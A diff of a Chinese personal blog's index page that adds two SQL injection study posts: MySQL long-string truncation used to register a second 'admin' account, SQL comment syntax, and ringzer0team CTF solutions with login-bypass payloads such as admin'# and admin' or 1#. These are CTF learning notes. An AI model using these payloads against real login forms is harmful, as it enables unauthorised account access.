@@ -294,6 +294,324 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/24/SQL注入笔记（2）：MySQL长字符截断/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lhaihai">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lhaihai's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/04/24/SQL注入笔记（2）：MySQL长字符截断/" itemprop="url">SQL注入笔记（2）：MySQL长字符截断</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-24T23:21:15+08:00">
+                2018-04-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全-SQL注入/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全 [SQL注入]</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h3><p>转载来自<a href="https://blog.csdn.net/SoDaoo/article/details/74331792" target="_blank" rel="noopener">MySQL 字符截断攻击</a></p>
+<p>先创建一张表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">table</span> <span class="keyword">users</span>(</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">not</span> <span class="literal">NULL</span> primary <span class="keyword">key</span> auto_increment,</span><br><span class="line">username <span class="built_in">char</span>(<span class="number">8</span>) <span class="keyword">not</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="keyword">password</span> <span class="built_in">char</span>(<span class="number">10</span>) <span class="keyword">not</span> <span class="literal">NULL</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>正常插入 admin ; admin</p>
+<p><code>insert into users(username,password) values(&#39;admin&#39;,&#39;admin&#39;);</code></p>
+<p>超出字符限制插入(用户名长度为8):</p>
+<p><code>insert into users(username,password) values(&#39;admin &#39;,&#39;admin&#39;);</code></p>
+<p><code>insert into users(username,password) values(&#39;admin        1&#39;,&#39;admin&#39;);</code></p>
+<p>超过位数的用户名会被截断 ,所以 ,admin                   1 与 admin共存于一张表</p>
+<p><code>select username from users where username = &#39;admin&#39;;</code></p>
+<p>发现两个用户都被select出来</p>
+<p>如果管理员的登录界面是这样判断的 :</p>
+<p><code>$sql = &quot;select count(*) from users where username = &#39;admin&#39; and password=&#39;任意&#39; &quot;;</code></p>
+<p>那我们只需要注册一个账号为<code>admin                  1</code>,<code>password =  &quot;任意&quot;</code>,</p>
+<p>就可以用admin登录</p>
+<h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><p><a href="https://ringzer0team.com/challenges/171" target="_blank" rel="noopener">https://ringzer0team.com/challenges/171</a></p>
+<p>随手试了一下二次注入，发现有点不像<br>于是进行长度截断<br>注册</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=admin                                    1#</span><br><span class="line">password=1</span><br></pre></td></tr></table></figure>
+<p>登录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=admin</span><br><span class="line">password=1</span><br></pre></td></tr></table></figure>
+<p>#### </p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/24/SQL注入笔记（1）：注释/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lhaihai">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lhaihai's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/04/24/SQL注入笔记（1）：注释/" itemprop="url">SQL注入笔记（1）：注释</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-24T23:20:39+08:00">
+                2018-04-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全-SQL注入/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全 [SQL注入]</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">Oracle</span><br><span class="line"></span><br><span class="line">REM单行注释</span><br><span class="line"></span><br><span class="line">-- 单行注释</span><br><span class="line"></span><br><span class="line">/*多行注释*/ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MS SQL Server</span><br><span class="line"></span><br><span class="line">-- 单行注释</span><br><span class="line"></span><br><span class="line">/*多行注释*/ </span><br><span class="line"></span><br><span class="line">MySQL</span><br><span class="line"></span><br><span class="line">#单行注释</span><br><span class="line"></span><br><span class="line">-- 单行注释（特别注意，-- 后有个空格！！！）</span><br><span class="line"></span><br><span class="line">/*多行注释*/ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">总结：</span><br><span class="line"></span><br><span class="line">/*多行注释*/ 和-- 单行注释都差不多，MySQL要注意。</span><br><span class="line"></span><br><span class="line">非标准的#和REM最好还是不要用了</span><br><span class="line"></span><br><span class="line">为了兼容-- 后面最好都加空格</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MySQL注释的说明－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－</span><br><span class="line"></span><br><span class="line">‘--’作为注释起始标记</span><br><span class="line"></span><br><span class="line">一些其他SQL数据库采用“--”作为注释开始标志。MySQL服务器采用“#”作为注释起始字符。对于MySQL服务器，也能使用C风格的注释：/*该处为注释*/。请参见9.5节，“注释语法”。</span><br><span class="line"></span><br><span class="line">MySQL服务器3.23.3和更高版本支持“--”注释风格，但要求注释后面跟1空格（或控制字符，如新行）。之所以要求使用空格，是为了防止与自动生成SQL查询有关的问题，它采用了类似下面的代码，其中，自动为“!payment!”插入“payment”的值：</span><br><span class="line"></span><br><span class="line">UPDATE account SET credit=credit-!payment!</span><br><span class="line"></span><br><span class="line">考虑一下，如果“payment”的值为负数如“-1”时会出现什么情况：</span><br><span class="line"></span><br><span class="line">UPDATE account SET credit=credit--1</span><br><span class="line"></span><br><span class="line">在SQL中“credit--1”是合法的表达式，但是，如果“--1”被解释为注释开始，部分表达式将被舍弃。其结果是，表达式的意义与预期的意义完全不同。</span><br><span class="line"></span><br><span class="line">UPDATE account SET credit=credit</span><br><span class="line"></span><br><span class="line">该语句不会对值作任何更改！这表明，允许注释以“--”开始会产生严重后果。</span><br><span class="line"></span><br><span class="line">采用MySQL服务器3.23.3和更高版本中的这类注释方法，“credit--1”实际上很安全。</span><br><span class="line"></span><br><span class="line">另一个安全特性是，mysql命令行客户端将删除所有以“--”开头的行。</span><br><span class="line"></span><br><span class="line">仅当使用高于3.23.3的MySQL时，下述信息才有意义：</span><br><span class="line"></span><br><span class="line">如果有1个文本文件形式的SQL程序，该文件包含“--”注释，应按下述方式使用replace实用工具，将其转换为使用“#”字符的注释：</span><br><span class="line"></span><br><span class="line">shell&gt; replace &quot; --&quot; &quot; #&quot; &lt; text-file-with-funny-comments.sql \</span><br><span class="line"></span><br><span class="line">         | mysql db_name</span><br><span class="line"></span><br><span class="line">而不是通常的：</span><br><span class="line"></span><br><span class="line">shell&gt; mysql db_name &lt; text-file-with-funny-comments.sql</span><br><span class="line"></span><br><span class="line">你也可以编辑注释文件，将“--”注释更改为“#”注释：</span><br><span class="line"></span><br><span class="line">shell&gt; replace &quot; --&quot; &quot; #&quot; -- text-file-with-funny-comments.sql</span><br><span class="line"></span><br><span class="line">使用下述命令将其改回去：</span><br><span class="line"></span><br><span class="line">shell&gt; replace &quot; #&quot; &quot; --&quot; -- text-file-with-funny-comments.sql</span><br></pre></td></tr></table></figure>
+<h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><h3 id="Most-basic-SQLi-pattern-point-1"><a href="#Most-basic-SQLi-pattern-point-1" class="headerlink" title="Most basic SQLi pattern.(point 1)"></a><a href="https://ringzer0team.com/challenges/1" target="_blank" rel="noopener">Most basic SQLi pattern.(point 1)</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin&apos;#</span><br><span class="line">password: 1</span><br></pre></td></tr></table></figure>
+<p>签到题，注释后面的password语句</p>
+<p>解释：</p>
+<p>如果后台的数据库语句是这样子的</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="string">'$username'</span> <span class="keyword">and</span> <span class="keyword">password</span> = <span class="string">'$password'</span></span><br></pre></td></tr></table></figure>
+<p>输入之后，后面的password就被注释掉了，如果有admin的用户，就可以登录成功</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="keyword">admin</span> # <span class="keyword">and</span> <span class="keyword">password</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h3 id="ACL-rulezzz-the-world-point-2"><a href="#ACL-rulezzz-the-world-point-2" class="headerlink" title="ACL rulezzz the world.(point 2)"></a><a href="https://ringzer0team.com/challenges/2" target="_blank" rel="noopener">ACL rulezzz the world.(point 2)</a></h3><p>随手测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos;</span><br></pre></td></tr></table></figure>
+<p>得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;admin&apos;&apos;&apos; at line 4</span><br></pre></td></tr></table></figure>
+<p>随手闭合一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; or 1#</span><br></pre></td></tr></table></figure>
+<p>### </p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/23/Python合并Excel表格/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1462,295 +1780,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/13/hexo-学习笔记/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Lhaihai">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Lhaihai's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/04/13/hexo-学习笔记/" itemprop="url">hexo 学习笔记</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-13T23:14:58+08:00">
-                2018-04-13
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/GitHub-hexo建站/" itemprop="url" rel="index">
-                    <span itemprop="name">GitHub hexo建站</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>参考链接：</p>
-<h5 id="Hexo博客教程-一-Hexo的前期部署："><a href="#Hexo博客教程-一-Hexo的前期部署：" class="headerlink" title="Hexo博客教程(一):Hexo的前期部署："></a>Hexo博客教程(一):Hexo的前期部署：</h5><p><a href="https://www.jianshu.com/p/9f04ee6371ce" target="_blank" rel="noopener">https://www.jianshu.com/p/9f04ee6371ce</a></p>
-<h5 id="Hexo博客教程-二-基本功能和网站优化："><a href="#Hexo博客教程-二-基本功能和网站优化：" class="headerlink" title="Hexo博客教程(二):基本功能和网站优化："></a>Hexo博客教程(二):基本功能和网站优化：</h5><p><a href="https://www.jianshu.com/p/2a70262295e4" target="_blank" rel="noopener">https://www.jianshu.com/p/2a70262295e4</a></p>
-<h5 id="Hexo博客教程-三-参考资料"><a href="#Hexo博客教程-三-参考资料" class="headerlink" title="Hexo博客教程(三):参考资料"></a>Hexo博客教程(三):参考资料</h5><p><a href="https://www.jianshu.com/p/8f727b4c3cd1" target="_blank" rel="noopener">https://www.jianshu.com/p/8f727b4c3cd1</a></p>
-<h5 id="设置访问次数统计"><a href="#设置访问次数统计" class="headerlink" title="设置访问次数统计"></a>设置访问次数统计</h5><p>不蒜子统计</p>
-<p><a href="http://theme-next.iissnan.com/third-party-services.html#analytics-busuanzi" target="_blank" rel="noopener">http://theme-next.iissnan.com/third-party-services.html#analytics-busuanzi</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/13/Daily-plan/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Lhaihai">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Lhaihai's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/04/13/Daily-plan/" itemprop="url">Daily Plan</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-13T23:04:52+08:00">
-                2018-04-13
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/good/" itemprop="url" rel="index">
-                    <span itemprop="name">good</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>python 写一个自动签到，签到成功发送短信到我手机，还会定时启动</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1805,7 +1834,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-count">16</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1816,7 +1845,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -1827,7 +1856,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-count">10</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
